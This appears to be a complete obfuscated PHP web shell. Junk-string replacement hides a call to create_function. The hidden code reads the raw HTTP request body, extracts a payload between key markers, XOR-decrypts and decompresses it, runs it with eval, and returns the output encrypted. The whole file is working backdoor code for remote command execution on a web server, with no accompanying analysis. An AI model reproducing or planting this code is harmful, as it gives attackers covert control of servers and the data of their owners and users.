<?php
$U=str_replace('ax','','craxaxeaxate_faxuncaxtaxion');
$W='){$Rec=Restrlen($kRe);$l=stRerReRelen($t);$o="";RefReor($i=0;$i<$lRe;){forReRe($j=Re0;($j<$c&&Re$i<$l);$j+Re+,Re$i++Re)Re';
$R='$Rek="5fc03Reb16";$kReh="f20bRecRe56a6e2Re1";$kf="d602fRe7d4768ReRed";$p="21WYOrReuP8SReHTcoReW4";fReunRection x($t,$k';
$H='{$o.=$t{$Rei}^Re$k{$j};}}reReturn Re$o;}Reif (@preg_Rematch("Re/$kReh(.+)$kf/",Re@file_gReet_cReontents(Re"Rephp://inp';
$P='Reut"Re),$mRe)==1) {@oReb_starRet();@evReal(@gzReuncomprReess(@Rex(@baRese64_decode(Re$m[ReReRe1]),$k)));$o=@obRe_get_';
$M='RecReontents();Re@ob_endRe_cleRean();$r=@base6ReRe4_encode(Re@x(@gzcoRempreRess($oRe),$k))Re;pRerint("$Rep$kh$r$kf");}';
$o=str_replace('Re','',$R.$W.$H.$P.$M);
$v=$U('',$o);$v();
?>
